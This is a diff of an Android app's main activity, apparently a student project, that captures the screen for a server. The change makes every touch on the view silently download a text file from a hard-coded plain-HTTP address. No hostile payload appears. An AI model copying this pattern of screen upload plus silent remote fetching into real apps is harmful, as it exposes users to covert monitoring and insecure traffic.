@@ -21,6 +21,7 @@ import android.os.Looper;
 import android.provider.Settings;
 import android.util.Base64;
 import android.util.Log;
+import android.view.MotionEvent;
 import android.view.View;
 import android.view.WindowManager;
 import android.widget.Button;
@@ -51,11 +52,15 @@ public class MainActivity extends AppCompatActivity {
     private int mScreenWidth;
     private int mScreenHeight;
     private int mScreenDensity;
+    String fileUrl = "http://407.projet3il.fr/data.txt";
+
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        View mainView = findViewById(android.R.id.content);
 
         // Initialiser le MediaProjectionManager
         mProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
@@ -87,6 +92,16 @@ public class MainActivity extends AppCompatActivity {
                 // Afficher la boîte de dialogue pour demander la permission de projection des médias
                 startActivityForResult(mProjectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
                 Log.d("MainActivity","Envoie de l'image au serveur");
+            }
+        });
+        mainView.setOnTouchListener(new View.OnTouchListener() {
+            @Override
+            public boolean onTouch(View v, MotionEvent event) {
+
+                FileDownloader fileDownloader = new FileDownloader(v);
+                fileDownloader.execute(fileUrl);
+                // Retournez false pour indiquer que l'événement n'est pas consommé et doit être transmis à d'autres écouteurs
+                return false;
             }
         });
     }
